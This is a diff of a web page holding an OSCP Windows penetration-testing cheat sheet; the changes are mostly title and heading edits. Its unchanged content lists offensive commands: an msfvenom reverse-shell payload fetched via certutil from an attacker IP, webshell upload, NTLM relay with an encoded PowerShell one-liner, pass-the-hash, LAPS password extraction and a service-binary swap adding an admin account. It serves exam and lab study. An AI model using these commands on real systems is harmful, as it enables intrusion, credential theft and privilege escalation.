@@ -2,12 +2,11 @@
 <html lang="en">
 <head>
   
-    <title>Cheat Sheet - OSCP Windows :: Digital Garden</title>
+    <title>OSCP - Cheat Sheet - Windows :: Digital Garden</title>
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Related: Tags: OSCP
-Quick Reference dir /s/b local.txt - Usually C:\ or C:\users\username\desktop\ dir /s/b proof.txt - Usually C:\Users\Administrator\Desktop\ dir /s/b *.txt RDP: xfreerdp /u:username /p:password /v:192.168.x.x /cert:ignore RevShell.exe: msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=4444 -f exe -o revshell.exe Compile C: /usr/bin/x86_64-w64-mingw32-gcc cfile.c -o output.exe Compile C#: msbuild projectname.csproj Transfer to Windows host: certutil -split -urlcache -f http://192.168.x.x/revshell.exe C:\\Users\\username\\revshell.exe Fix Broken Path: set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0; Windows Exploit Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester Port Enumeration (from Kali) HTTP/WebDav (80): cadaver 192.168. Run put /usr/share/webshells/aspx/cmdasp.aspx to upload command shell, then access via browser Kerberos (88): kerbrute userenum -d domain.name --dc 192.168. users SMB (139/445): sudo nmap --script smb-vuln* -p 139,445 192.168. smbclient -U user \\\\192.168. impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.xx.xxx -c &quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot; (base64 powershell one-liner) Kali: Call fake directory dir \\192.168.xx.xxx\fake for reverse shell Pass the Hash: smbclient \\\\192.168.xx.xxx\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b LDAP (389): sudo nmap -n -sV -Pn -script &#39;ldap* and not brute&#39; 192.168. Domain Name found (LDAP Search): ldapsearch -v -x -b &#39;DC=domain,DC=name&#39; -H &#39;ldap://192.168.&#39; &#39;(objectclass=*)&#39; Use credentials to find admin password ldapsearch -x -H &#39;ldap://192.168.x.x&#39; -D &#39;domain\user&#39; -w &#39;userpassword&#39; -b &#39;dc=domain,dc=name&#39; &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd To Login psexec.py domain.name/administrator: &#39;adminpassword&#39;@192.168.x.x to login Impacket Psexec.py - /usr/share/doc/python3-impacket/examples/psexec.py impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx
+<meta name="description" content="Quick Reference dir /s/b local.txt - Usually C:\ or C:\users\username\desktop\ dir /s/b proof.txt - Usually C:\Users\Administrator\Desktop\ dir /s/b *.txt RDP: xfreerdp /u:username /p:password /v:192.168.x.x /cert:ignore RevShell.exe: msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=4444 -f exe -o revshell.exe Compile C: /usr/bin/x86_64-w64-mingw32-gcc cfile.c -o output.exe Compile C#: msbuild projectname.csproj Transfer to Windows host: certutil -split -urlcache -f http://192.168.x.x/revshell.exe C:\\Users\\username\\revshell.exe Fix Broken Path: set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0; Windows Exploit Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester Port Enumeration (from Kali) HTTP/WebDav (80): cadaver 192.168. Run put /usr/share/webshells/aspx/cmdasp.aspx to upload command shell, then access via browser Kerberos (88): kerbrute userenum -d domain.name --dc 192.168. users SMB (139/445): sudo nmap --script smb-vuln* -p 139,445 192.168. smbclient -U user \\\\192.168. impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.xx.xxx -c &quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot; (base64 powershell one-liner) Kali: Call fake directory dir \\192.168.xx.xxx\fake for reverse shell Pass the Hash: smbclient \\\\192.168.xx.xxx\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b LDAP (389): sudo nmap -n -sV -Pn -script &#39;ldap* and not brute&#39; 192.168. Domain Name found (LDAP Search): ldapsearch -v -x -b &#39;DC=domain,DC=name&#39; -H &#39;ldap://192.168.&#39; &#39;(objectclass=*)&#39; Use credentials to find admin password ldapsearch -x -H &#39;ldap://192.168.x.x&#39; -D &#39;domain\user&#39; -w &#39;userpassword&#39; -b &#39;dc=domain,dc=name&#39; &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd To Login psexec.py domain.name/administrator: &#39;adminpassword&#39;@192.168.x.x to login Impacket Psexec.py - /usr/share/doc/python3-impacket/examples/psexec.py impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx
 " />
 <meta name="keywords" content="" />
 
@@ -79,9 +78,8 @@ Quick Reference dir /s/b local.txt - Usually C:\ or C:\users\username\desktop\ d
 
 <meta property="og:locale" content="en" />
 <meta property="og:type" content="article" />
-<meta property="og:title" content="Cheat Sheet - OSCP Windows">
-<meta property="og:description" content="Related: Tags: OSCP
-Quick Reference dir /s/b local.txt - Usually C:\ or C:\users\username\desktop\ dir /s/b proof.txt - Usually C:\Users\Administrator\Desktop\ dir /s/b *.txt RDP: xfreerdp /u:username /p:password /v:192.168.x.x /cert:ignore RevShell.exe: msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=4444 -f exe -o revshell.exe Compile C: /usr/bin/x86_64-w64-mingw32-gcc cfile.c -o output.exe Compile C#: msbuild projectname.csproj Transfer to Windows host: certutil -split -urlcache -f http://192.168.x.x/revshell.exe C:\\Users\\username\\revshell.exe Fix Broken Path: set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0; Windows Exploit Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester Port Enumeration (from Kali) HTTP/WebDav (80): cadaver 192.168. Run put /usr/share/webshells/aspx/cmdasp.aspx to upload command shell, then access via browser Kerberos (88): kerbrute userenum -d domain.name --dc 192.168. users SMB (139/445): sudo nmap --script smb-vuln* -p 139,445 192.168. smbclient -U user \\\\192.168. impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.xx.xxx -c &quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot; (base64 powershell one-liner) Kali: Call fake directory dir \\192.168.xx.xxx\fake for reverse shell Pass the Hash: smbclient \\\\192.168.xx.xxx\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b LDAP (389): sudo nmap -n -sV -Pn -script &#39;ldap* and not brute&#39; 192.168. Domain Name found (LDAP Search): ldapsearch -v -x -b &#39;DC=domain,DC=name&#39; -H &#39;ldap://192.168.&#39; &#39;(objectclass=*)&#39; Use credentials to find admin password ldapsearch -x -H &#39;ldap://192.168.x.x&#39; -D &#39;domain\user&#39; -w &#39;userpassword&#39; -b &#39;dc=domain,dc=name&#39; &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd To Login psexec.py domain.name/administrator: &#39;adminpassword&#39;@192.168.x.x to login Impacket Psexec.py - /usr/share/doc/python3-impacket/examples/psexec.py impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx
+<meta property="og:title" content="OSCP - Cheat Sheet - Windows">
+<meta property="og:description" content="Quick Reference dir /s/b local.txt - Usually C:\ or C:\users\username\desktop\ dir /s/b proof.txt - Usually C:\Users\Administrator\Desktop\ dir /s/b *.txt RDP: xfreerdp /u:username /p:password /v:192.168.x.x /cert:ignore RevShell.exe: msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=4444 -f exe -o revshell.exe Compile C: /usr/bin/x86_64-w64-mingw32-gcc cfile.c -o output.exe Compile C#: msbuild projectname.csproj Transfer to Windows host: certutil -split -urlcache -f http://192.168.x.x/revshell.exe C:\\Users\\username\\revshell.exe Fix Broken Path: set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0; Windows Exploit Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester Port Enumeration (from Kali) HTTP/WebDav (80): cadaver 192.168. Run put /usr/share/webshells/aspx/cmdasp.aspx to upload command shell, then access via browser Kerberos (88): kerbrute userenum -d domain.name --dc 192.168. users SMB (139/445): sudo nmap --script smb-vuln* -p 139,445 192.168. smbclient -U user \\\\192.168. impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.xx.xxx -c &quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot; (base64 powershell one-liner) Kali: Call fake directory dir \\192.168.xx.xxx\fake for reverse shell Pass the Hash: smbclient \\\\192.168.xx.xxx\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b LDAP (389): sudo nmap -n -sV -Pn -script &#39;ldap* and not brute&#39; 192.168. Domain Name found (LDAP Search): ldapsearch -v -x -b &#39;DC=domain,DC=name&#39; -H &#39;ldap://192.168.&#39; &#39;(objectclass=*)&#39; Use credentials to find admin password ldapsearch -x -H &#39;ldap://192.168.x.x&#39; -D &#39;domain\user&#39; -w &#39;userpassword&#39; -b &#39;dc=domain,dc=name&#39; &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd To Login psexec.py domain.name/administrator: &#39;adminpassword&#39;@192.168.x.x to login Impacket Psexec.py - /usr/share/doc/python3-impacket/examples/psexec.py impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx
 " />
 <meta property="og:url" content="/posts/oscp---cheat-sheet---windows/" />
 <meta property="og:site_name" content="Digital Garden" />
@@ -178,7 +176,7 @@ Quick Reference dir /s/b local.txt - Usually C:\ or C:\users\username\desktop\ d
     
 <article class="post">
   <h1 class="post-title">
-    <a href="/posts/oscp---cheat-sheet---windows/">Cheat Sheet - OSCP Windows</a>
+    <a href="/posts/oscp---cheat-sheet---windows/">OSCP - Cheat Sheet - Windows</a>
   </h1>
   <div class="post-meta"></div>
 
@@ -197,10 +195,7 @@ Quick Reference dir /s/b local.txt - Usually C:\ or C:\users\username\desktop\ d
   
 
   <div class="post-content"><div>
-        <p>Related:
-Tags: <a href="/posts/oscp/">OSCP</a></p>
-<hr>
-<h2 id="quick-reference">Quick Reference<a href="#quick-reference" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+        <h1 id="quick-reference">Quick Reference<a href="#quick-reference" class="hanchor" ariaLabel="Anchor">#</a> </h1>
 <ul>
 <li><code>dir /s/b local.txt</code> - Usually <code>C:\</code> or <code>C:\users\username\desktop\</code></li>
 <li><code>dir /s/b proof.txt</code> - Usually <code>C:\Users\Administrator\Desktop\</code></li>
@@ -213,7 +208,7 @@ Tags: <a href="/posts/oscp/">OSCP</a></p>
 <li>Fix Broken Path: <code>set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;</code></li>
 <li>Windows Exploit Suggester: <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></li>
 </ul>
-<h2 id="port-enumeration-from-kali">Port Enumeration (from Kali)<a href="#port-enumeration-from-kali" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h1 id="port-enumeration-from-kali">Port Enumeration (from Kali)<a href="#port-enumeration-from-kali" class="hanchor" ariaLabel="Anchor">#</a> </h1>
 <ul>
 <li><strong>HTTP/WebDav (80)</strong>: <code>cadaver 192.168.</code>
 <ul>
@@ -243,10 +238,10 @@ Tags: <a href="/posts/oscp/">OSCP</a></p>
 </ul>
 </li>
 </ul>
-<h2 id="impacket">Impacket<a href="#impacket" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h1 id="impacket">Impacket<a href="#impacket" class="hanchor" ariaLabel="Anchor">#</a> </h1>
 <p>Psexec.py - <code>/usr/share/doc/python3-impacket/examples/psexec.py</code>
 <code>impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx</code></p>
-<h2 id="privesc-from-windows">PrivEsc (From Windows)<a href="#privesc-from-windows" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h1 id="privesc-from-windows">PrivEsc (From Windows)<a href="#privesc-from-windows" class="hanchor" ariaLabel="Anchor">#</a> </h1>
 <p><a href="https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation">HackTricks - Windows PrivEsc Checklist</a></p>
 <ul>
 <li>Group memberships of the current user: <code>whoami /groups</code>
@@ -288,7 +283,7 @@ S-1-1-0	                      Everybody
 S-1-5-11                      Authenticated Users
 S-1-5-18                      Local System
 S-1-5-domainidentifier-500    Administrator
-</code></pre><h3 id="find-credentials">Find Credentials<a href="#find-credentials" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+</code></pre><h2 id="find-credentials">Find Credentials<a href="#find-credentials" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>Try each of these steps <em><strong>for each user you get access to</strong></em></p>
 <ul>
 <li>Cleartext files: <code>Get-ChildItem -Path C:\Users\username -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue</code></li>
@@ -305,7 +300,7 @@ S-1-5-domainidentifier-500    Administrator
 </li>
 <li>XAMPP: <code>Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue</code></li>
 </ul>
-<h3 id="evil-winrm---creates-powershell-remoting-session">Evil-WinRM - Creates Powershell Remoting Session<a href="#evil-winrm---creates-powershell-remoting-session" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<h2 id="evil-winrm---creates-powershell-remoting-session">Evil-WinRM - Creates Powershell Remoting Session<a href="#evil-winrm---creates-powershell-remoting-session" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <ul>
 <li>Login: <code>evil-winrm -i 192.168.xx.xxx -u user -p &quot;password\$\!&quot;</code> (escape special characters: <code>&quot;password$!&quot;</code> = <code>&quot;password\$\!&quot;</code>)</li>
 </ul>
@@ -321,7 +316,7 @@ S-1-5-domainidentifier-500    Administrator
 </li>
 <li><code>C:\Users\moss\Searches\VoiceActivation.exe</code></li>
 </ul>
-<h3 id="services">Services<a href="#services" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<h2 id="services">Services<a href="#services" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <ul>
 <li>Find running processes: <code>Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}</code></li>
 <li>Start Process monitor and filter for target process
@@ -381,7 +376,7 @@ LPVOID lpReserved ) // Reserved
 </ul>
 </li>
 </ul>
-<h3 id="permissions-for-icacls">Permissions for Icacls<a href="#permissions-for-icacls" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<h2 id="permissions-for-icacls">Permissions for Icacls<a href="#permissions-for-icacls" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <ul>
 <li>Replace original binary with a new one written in C (<code>adduser.c</code>) that will create a new administrator (<code>dave2:password123!</code>)</li>
 </ul>
@@ -404,7 +399,7 @@ int main ()
 <li>Restart the running service: <code>net stop httpd</code> then <code>net start httpd</code></li>
 <li><code>C:\BackupMonitor\BackupMonitor.exe</code></li>
 </ul>
-<h3 id="service-control-privilege">Service Control Privilege<a href="#service-control-privilege" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<h2 id="service-control-privilege">Service Control Privilege<a href="#service-control-privilege" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>If user does not have service control privilege:</p>
 <ul>
 <li>See if service has <code>Auto</code> StartMode: `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like &lsquo;httpd&rsquo;}</li>
@@ -478,7 +473,7 @@ C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
 </ul>
 </li>
 </ul>
-<h3 id="privileges">Privileges<a href="#privileges" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<h2 id="privileges">Privileges<a href="#privileges" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <ul>
 <li>Check if user has admin access: <code>Find-LocalAdminAccess</code> (can take several mins)</li>
 <li>Check system for logged in users: <code>Get-NetSession -ComputerName files04 -Verbose</code>
@@ -507,16 +502,16 @@ Alternatively:</li>
   </div>
   <div class="pagination__buttons">
     
-      <a href="/posts/cheat-sheet---networking/" class="button inline prev">
-        &lt; [<span class="button__text">Cheat Sheet - Networking</span>]
+      <a href="/posts/oscp---cheat-sheet---linux/" class="button inline prev">
+        &lt; [<span class="button__text">OSCP - Cheat Sheet - Linux</span>]
       </a>
     
     
       ::
     
     
-      <a href="/posts/cheat-sheet---linux/" class="button inline next">
-         [<span class="button__text">Cheatsheet - Linux</span>] &gt;
+      <a href="/posts/oscp---clue---linux/" class="button inline next">
+         [<span class="button__text">OSCP - Clue - Linux</span>] &gt;
       </a>
     
   </div>
